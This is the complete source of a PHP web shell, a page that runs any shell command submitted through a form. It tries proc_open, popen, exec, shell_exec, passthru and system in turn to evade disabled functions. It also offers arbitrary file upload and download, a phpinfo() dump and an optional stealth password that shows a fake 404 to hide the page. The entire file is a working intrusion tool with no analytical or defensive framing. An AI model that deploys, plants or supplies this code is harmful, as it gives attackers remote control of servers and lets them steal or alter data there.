<?php
    error_reporting(E_ALL);
    if(function_exists("get_magic_quotes_gpc") && @get_magic_quotes_gpc()) {
        function stripslashes_deep($value) {
            return is_array($value) ? array_map("stripslashes_deep", $value) : stripslashes($value);
        }
        $_GET = stripslashes_deep($_GET);
        $_POST = stripslashes_deep($_POST);
        $_COOKIE = stripslashes_deep($_COOKIE);
    }

    $stealth_password = "";
    if($stealth_password !== "" && (!isset($_GET["pw"]) || $_GET["pw"] !== $stealth_password)) {
        http_response_code(404);
        exit();
    }

    if(isset($_POST["phpinfo"])) {
        phpinfo();
        exit();
    }

    if(isset($_POST["downloadFile"]) && trim($_POST["downloadFile"]) !== "") {
        $file = $_POST["downloadFile"];
        if(is_readable($file)) {
            header('Content-Type: ' . mime_content_type($file));
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit();
        } else {
            $download_msg = "Error accessing file <code>" . htmlspecialchars($file) . "</code><br />\n";
        }
    }

    if(isset($_POST["uploadSubmit"])) {
        if(isset($_POST["uploadDir"]) && trim($_POST["uploadDir"]) !== "") {
            $upload_dir = $_POST["uploadDir"];
        } else {
            $upload_dir = ".";
        }
        $upload_msg = "";
        foreach($_FILES["uploadFiles"]["error"] as $key => $error) {
            if($error == UPLOAD_ERR_OK) {
                $filename = basename($_FILES["uploadFiles"]["name"][$key]);
                $dest = $upload_dir . DIRECTORY_SEPARATOR . $filename;
                if(move_uploaded_file($_FILES["uploadFiles"]["tmp_name"][$key], $dest)) {
                    $upload_msg .= "Successfully uploaded <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br />\n";
                } else {
                    $upload_msg .= "Error saving <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br />\n";
                }
            } else if($error == UPLOAD_ERR_INI_SIZE) {
                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["uploadFiles"]["name"][$key])) . "</code>: File too large, maximum is <code>" . htmlspecialchars(ini_get("upload_max_filesize")) ."</code><br />\n";
            } else {
                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["uploadFiles"]["name"][$key])) . "</code>, error code: <code>" . htmlspecialchars($error) . "</code><br />\n";
            }
        }
    }

    $execute = isset($_POST["cmd"]) && trim($_POST["cmd"] !== "");
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>PHP Webshell</title>
        <style>
            body {
                font-family: sans-serif;
            }
            input[type=text] {
                font-family: monospace;
            }
            .cmdBox {
                width: 80%;
            }
            .infoText {
                margin: 3px auto;
            }
            .featureBox {
                margin: 1rem auto;
            }
        </style>
    </head>
    <body>
        <form id="cmdForm" method="POST" action="">
            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
            <input type="submit" name="cmdSubmit" value="Run" />
        </form>
        <div class="infoText">
<?php
    if($execute) {
        echo "Output of command: <code>" . htmlspecialchars($_POST["cmd"]) . "</code>\n";
    } else {
        echo "Run a command to see its output\n";
    }
?>
        </div>
        <textarea readonly="readonly" rows="25" class="cmdBox">
<?php
    if($execute) {
        if(function_exists("proc_open")) {
            $exec_func = "proc_open";
            $descriptorspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
            );
            $proc = $exec_func($_POST["cmd"], $descriptorspec, $pipes);
            echo htmlspecialchars(stream_get_contents($pipes[1]));
            echo htmlspecialchars(stream_get_contents($pipes[2]));
            array_map("fclose", $pipes);
            $exit_code = proc_close($proc);
        } else if(function_exists("popen")) {
            $exec_func = "popen";
            $handle = $exec_func($_POST["cmd"], "r");
            echo htmlspecialchars(stream_get_contents($handle));
            $exit_code = pclose($handle);
        } else if(function_exists("exec")) {
            $exec_func = "exec";
            $exec_func($_POST["cmd"], $output, $exit_code);
            echo htmlspecialchars(implode("\n", $output));
        } else if(function_exists("shell_exec")) {
            $exec_func = "shell_exec";
            echo htmlspecialchars($exec_func($_POST["cmd"]));
        } else if(function_exists("passthru")) {
            $exec_func = "passthru";
            $exec_func($_POST["cmd"], $exit_code);
        } else if(function_exists("system")) {
            $exec_func = "system";
            $exec_func($_POST["cmd"], $exit_code);
        } else {
            echo "Error - All of the following execution functions have been disabled in PHP:\n";
            echo "proc_open\npopen\nexec\nshell_exec\npassthru\nsystem\n";
        }
    }
?>
        </textarea>
        <div class="infoText">
<?php
    if(isset($exec_func)) {
        echo "Execution function: <code>" . $exec_func . "</code>";
    }
    if(isset($exit_code)) {
        echo " &bull; Exit code: <code>" . htmlspecialchars($exit_code) . "</code>\n";
    }
?>
        </div>
        <div class="featureBox">
            <b>File Upload</b>
            <div>
<?php
    if(isset($upload_msg)) {
        echo $upload_msg;
    }
?>
            </div>
            <form method="POST" action="" enctype="multipart/form-data">
                <input type="text" name="uploadDir" placeholder="Destination folder" />
                <input type="file" name="uploadFiles[]" multiple="multiple" />
                <input type="submit" name="uploadSubmit" value="Upload" />
            </form>
        </div>
        <div class="featureBox">
            <b>File Download</b>
            <div>
<?php
    if(isset($download_msg)) {
        echo $download_msg;
    }
?>
            </div>
            <form method="POST" action="">
                <input type="text" name="downloadFile" placeholder="File to download" />
                <input type="submit" name="downloadSubmit" value="Download" />
            </form>
        </div>
        <div class="featureBox">
            <b>Info</b>
            <form method="POST" action="" target="_blank">
                <input type="submit" name="phpinfo" value="phpinfo()" />
            </form>
        </div>
        <script>
            function saveHistory() {
                var cmd = document.getElementById("cmd").value;
                if(cmd.trim() != "" && cmd != shellHistory[shellHistory.length - 1]) {
                    shellHistory.push(cmd);
                }
                sessionStorage.setItem("shellHistory", JSON.stringify(shellHistory));
            }
            function cycleHistory(event) {
                var cmdInput = document.getElementById("cmd");
                if(event.code == "ArrowUp" && historyPos > 0) {
                    historyPos--;
                    cmdInput.value = shellHistory[historyPos];
                } else if(event.code == "ArrowDown" && historyPos < shellHistory.length) {
                    historyPos++;
                    if(historyPos < shellHistory.length) {
                        cmdInput.value = shellHistory[historyPos];
                    } else {
                        cmdInput.value = "";
                    }
                }
                if(event.code == "ArrowUp" || event.code == "ArrowDown") {
                    cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
                    event.preventDefault();
                }
            }
            var shellHistory = JSON.parse(sessionStorage.getItem("shellHistory"));
            if(shellHistory == null) {
                shellHistory = new Array();
            }
            var historyPos = shellHistory.length;
            document.getElementById("cmdForm").addEventListener("submit", saveHistory);
            document.getElementById("cmd").addEventListener("keydown", cycleHistory);
        </script>
    </body>
</html>
